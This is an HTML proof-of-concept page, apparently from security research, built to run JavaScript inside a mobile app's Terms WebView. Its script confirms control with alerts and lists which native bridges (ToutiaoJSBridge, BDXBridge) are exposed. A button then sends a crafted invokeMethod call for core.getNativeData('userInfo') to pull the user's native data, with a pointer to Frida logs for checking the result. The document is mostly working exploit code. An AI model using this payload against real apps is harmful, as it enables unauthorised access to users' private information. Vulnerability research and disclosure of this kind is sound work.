<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>GAUTH XSS POC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      html, body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        font-family: sans-serif;
        background: #f5f5f5;
      }
      .wrap {
        padding: 24px;
      }
      h1 {
        font-size: 24px;
        margin-bottom: 12px;
      }
      p {
        font-size: 16px;
      }
      button {
        display: block;
        margin-top: 24px;
        padding: 14px 20px;
        font-size: 18px;
        width: 100%;
      }
      small {
        display: block;
        margin-top: 8px;
        color: #555;
      }
    </style>
  </head>
  <body>
    <div class="wrap">
      <h1>GAUTH XSS POC</h1>
      <p>If you see this inside the app, JS is running in the Terms WebView.</p>

      <button onclick="testBridge()">TEST NATIVE BRIDGE</button>
      <small>After pressing, check Frida logs for JSB2Impl.invokeMethod(core.getNativeData).</small>
    </div>

    <script>
      // Confirm control of the WebView
      alert("WebView controlled");

      // Show which bridges are exposed
      setTimeout(function () {
        var msg = [];
        if (window.BDXBridge) msg.push("BDXBridge");
        if (window.ToutiaoJSBridge) msg.push("ToutiaoJSBridge");
        alert("Available bridges: " + (msg.join(", ") || "none"));
      }, 1000);

      // Reuse the real bridge call you captured: core.getNativeData("userInfo")
      function testBridge() {
        try {
          var payload = {
            "func": "core.getNativeData",
            "params": { "key": "userInfo" },
            "JSSDK": "2.2.10",
            "__msg_type": "call",
            "__callback_id": "9999"
          };

          if (window.ToutiaoJSBridge && ToutiaoJSBridge.invokeMethod) {
            ToutiaoJSBridge.invokeMethod(JSON.stringify(payload));
            alert("Sent ToutiaoJSBridge.invokeMethod(core.getNativeData,userInfo)");
          } else if (window.BDXBridge && BDXBridge._invokeMethod) {
            BDXBridge._invokeMethod(JSON.stringify(payload));
            alert("Sent BDXBridge._invokeMethod(core.getNativeData,userInfo)");
          } else {
            alert("No bridge method available");
          }
        } catch (e) {
          alert("Bridge error: " + e);
        }
      }
    </script>
  </body>
</html>
